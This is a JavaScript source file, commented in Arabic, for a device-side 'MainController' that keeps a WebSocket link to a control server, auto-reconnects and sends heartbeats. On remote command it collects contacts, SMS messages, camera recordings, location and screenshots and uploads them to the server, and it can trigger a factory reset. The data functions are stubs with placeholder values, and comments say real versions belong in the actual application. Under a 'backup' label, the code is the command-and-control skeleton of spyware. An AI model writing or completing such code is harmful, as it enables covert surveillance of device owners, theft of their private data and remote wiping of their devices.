class MainController {
    constructor(deviceId) {
        this.deviceId = deviceId;
        this.serverUrl = 'ws://localhost:4000';
        this.websocket = null;
        this.isConnected = false;
        this.modules = {};
        
        this.initializeModules();
    }

    // تهيئة الوحدات
    initializeModules() {
        // استيراد الوحدات (في بيئة حقيقية)
        // this.modules.backup = new BackupModule(this.deviceId);
        // this.modules.camera = new CameraModule(this.deviceId);
        // this.modules.system = new SystemModule(this.deviceId);
    }

    // بدء الاتصال
    async start() {
        try {
            console.log('بدء الاتصال بخادم التحكم...');
            await this.connectToServer();
            this.setupEventHandlers();
            this.startHeartbeat();
        } catch (error) {
            console.error('خطأ في بدء الاتصال:', error);
            // إعادة المحاولة بعد 5 ثوان
            setTimeout(() => this.start(), 5000);
        }
    }

    // الاتصال بالخادم
    async connectToServer() {
        return new Promise((resolve, reject) => {
            try {
                this.websocket = new WebSocket(this.serverUrl);
                
                this.websocket.onopen = () => {
                    console.log('تم الاتصال بخادم التحكم');
                    this.isConnected = true;
                    this.registerDevice();
                    resolve();
                };
                
                this.websocket.onerror = (error) => {
                    console.error('خطأ في الاتصال:', error);
                    reject(error);
                };
                
                this.websocket.onclose = () => {
                    console.log('انقطع الاتصال بالخادم');
                    this.isConnected = false;
                    // إعادة الاتصال تلقائياً
                    setTimeout(() => this.start(), 5000);
                };
                
            } catch (error) {
                reject(error);
            }
        });
    }

    // تسجيل الجهاز
    registerDevice() {
        if (this.websocket && this.websocket.readyState === WebSocket.OPEN) {
            this.websocket.send(JSON.stringify({
                type: 'register',
                deviceId: this.deviceId,
                capabilities: this.getCapabilities()
            }));
        }
    }

    // الحصول على قدرات الجهاز
    getCapabilities() {
        return {
            backup: true,
            camera: true,
            system: true,
            location: true,
            screenshot: true
        };
    }

    // إعداد معالجات الأحداث
    setupEventHandlers() {
        if (!this.websocket) return;

        this.websocket.onmessage = (event) => {
            try {
                const message = JSON.parse(event.data);
                this.handleMessage(message);
            } catch (error) {
                console.error('خطأ في معالجة الرسالة:', error);
            }
        };
    }

    // معالجة الرسائل الواردة
    async handleMessage(message) {
        console.log('رسالة واردة:', message);

        try {
            switch (message.action) {
                case 'backup_contacts':
                    await this.handleBackupContacts();
                    break;
                
                case 'backup_sms':
                    await this.handleBackupSMS();
                    break;
                
                case 'record_camera':
                    await this.handleRecordCamera(message.duration);
                    break;
                
                case 'factory_reset':
                    await this.handleFactoryReset();
                    break;
                
                case 'get_location':
                    await this.handleGetLocation();
                    break;
                
                case 'take_screenshot':
                    await this.handleTakeScreenshot();
                    break;
                
                default:
                    console.warn('أمر غير معروف:', message.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ الأمر:', error);
            this.sendError(message.action, error.message);
        }
    }

    // معالجة نسخ جهات الاتصال
    async handleBackupContacts() {
        console.log('تنفيذ نسخ جهات الاتصال...');
        
        try {
            // محاكاة الحصول على جهات الاتصال
            const contacts = await this.getContacts();
            await this.uploadData('contacts.json', contacts);
            this.sendSuccess('backup_contacts', 'تم نسخ جهات الاتصال بنجاح');
        } catch (error) {
            throw new Error(`فشل في نسخ جهات الاتصال: ${error.message}`);
        }
    }

    // معالجة نسخ الرسائل النصية
    async handleBackupSMS() {
        console.log('تنفيذ نسخ الرسائل النصية...');
        
        try {
            // محاكاة الحصول على الرسائل
            const messages = await this.getSMS();
            await this.uploadData('sms.json', messages);
            this.sendSuccess('backup_sms', 'تم نسخ الرسائل النصية بنجاح');
        } catch (error) {
            throw new Error(`فشل في نسخ الرسائل النصية: ${error.message}`);
        }
    }

    // معالجة تسجيل الكاميرا
    async handleRecordCamera(duration = 30) {
        console.log(`تنفيذ تسجيل الكاميرا لمدة ${duration} ثانية...`);
        
        try {
            // محاكاة تسجيل الكاميرا
            const videoData = await this.recordCamera(duration);
            await this.uploadData('camera_recording.mp4', videoData);
            this.sendSuccess('record_camera', 'تم تسجيل الكاميرا بنجاح');
        } catch (error) {
            throw new Error(`فشل في تسجيل الكاميرا: ${error.message}`);
        }
    }

    // معالجة إعادة ضبط المصنع
    async handleFactoryReset() {
        console.log('تنفيذ إعادة ضبط المصنع...');
        
        try {
            // محاكاة إعادة الضبط
            await this.performFactoryReset();
            this.sendSuccess('factory_reset', 'تم إعادة ضبط المصنع بنجاح');
        } catch (error) {
            throw new Error(`فشل في إعادة ضبط المصنع: ${error.message}`);
        }
    }

    // معالجة الحصول على الموقع
    async handleGetLocation() {
        console.log('الحصول على الموقع...');
        
        try {
            const location = await this.getLocation();
            await this.uploadData('location.json', location);
            this.sendSuccess('get_location', 'تم الحصول على الموقع بنجاح');
        } catch (error) {
            throw new Error(`فشل في الحصول على الموقع: ${error.message}`);
        }
    }

    // معالجة التقاط لقطة شاشة
    async handleTakeScreenshot() {
        console.log('التقاط لقطة شاشة...');
        
        try {
            const screenshot = await this.takeScreenshot();
            await this.uploadData('screenshot.png', screenshot);
            this.sendSuccess('take_screenshot', 'تم التقاط لقطة الشاشة بنجاح');
        } catch (error) {
            throw new Error(`فشل في التقاط لقطة الشاشة: ${error.message}`);
        }
    }

    // إرسال رسالة نجاح
    sendSuccess(action, message) {
        this.sendMessage({
            type: 'success',
            action: action,
            message: message,
            timestamp: Date.now()
        });
    }

    // إرسال رسالة خطأ
    sendError(action, error) {
        this.sendMessage({
            type: 'error',
            action: action,
            error: error,
            timestamp: Date.now()
        });
    }

    // إرسال رسالة
    sendMessage(message) {
        if (this.websocket && this.websocket.readyState === WebSocket.OPEN) {
            this.websocket.send(JSON.stringify(message));
        }
    }

    // رفع البيانات
    async uploadData(filename, data) {
        try {
            const response = await fetch('http://localhost:4000/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    deviceId: this.deviceId,
                    filename: filename,
                    data: typeof data === 'string' ? data : JSON.stringify(data)
                })
            });
            
            if (!response.ok) {
                throw new Error('فشل في رفع البيانات');
            }
            
            return await response.json();
        } catch (error) {
            throw new Error(`خطأ في رفع البيانات: ${error.message}`);
        }
    }

    // بدء نبض القلب
    startHeartbeat() {
        setInterval(() => {
            if (this.isConnected) {
                this.sendMessage({
                    type: 'heartbeat',
                    deviceId: this.deviceId,
                    timestamp: Date.now()
                });
            }
        }, 30000); // كل 30 ثانية
    }

    // وظائف محاكاة (في التطبيق الحقيقي ستكون وظائف فعلية)
    async getContacts() {
        return [
            {name: 'محمد أحمد', phone: '0555555555'},
            {name: 'علي حسن', phone: '0666666666'}
        ];
    }

    async getSMS() {
        return [
            {sender: '0555555555', message: 'مرحباً، كيف حالك؟', date: '2023-10-01'},
            {sender: '0666666666', message: 'هل نلتقي غداً؟', date: '2023-10-02'}
        ];
    }

    async recordCamera(duration) {
        return 'video_data_simulation';
    }

    async performFactoryReset() {
        return true;
    }

    async getLocation() {
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10
        };
    }

    async takeScreenshot() {
        return 'screenshot_data_simulation';
    }
}

module.exports = MainController;